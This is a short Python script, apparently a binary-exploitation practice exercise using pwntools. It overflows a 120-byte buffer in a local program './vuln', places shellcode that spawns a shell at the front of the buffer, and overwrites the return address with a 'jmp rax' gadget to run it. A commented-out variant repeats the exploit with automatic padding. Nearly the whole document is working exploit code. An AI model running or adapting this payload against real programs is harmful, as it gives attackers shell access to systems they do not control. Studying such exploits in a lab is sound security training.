# Calculating manual using 120 - shellcode length to reach until the rip, because 120 wont work because there already ... size buffer of shellcode

from pwn import *
elf = context.binary = ELF("./vuln")
p = process()
offset = 120
jmp_rax = p64(0x000000000040109c)
shellcode = asm(shellcraft.sh())     # Generate shellcode
padding_length = 120 - len(shellcode)  # Calculate required padding length
print(f"Shellcode length: {len(shellcode)}")
print(f"Padding length: {padding_length}")
payload = shellcode + b"A" * padding_length + jmp_rax  # Manually pad
write("payload",payload)
p.sendline(payload)
p.interactive()

# Automating calculating rest of pad using .lsjust() function

# from pwn import *

# elf = context.binary = ELF('./vuln')
# p = process()

# JMP_RAX = 0x40109c

# payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
# payload = payload.ljust(120, b'A')    # pad until RIP
# payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

# p.sendline(payload)
# p.interactive()